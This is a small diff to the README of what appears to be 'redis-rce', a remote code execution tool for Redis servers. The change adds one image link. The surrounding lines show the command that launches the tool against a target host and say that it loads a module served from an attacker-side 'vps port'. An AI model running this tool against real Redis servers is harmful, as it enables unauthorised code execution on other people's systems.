@@ -34,7 +34,7 @@ optional arguments:
 ```
 python redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f module.so
 ```
-
+![redis-rce](https://github.com/user-attachments/assets/9f816e2c-148d-4288-81ef-d6081a5dc64a)
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/20190708220258.png)
 
 The default target port is 6379 and the default vps port is 21000.
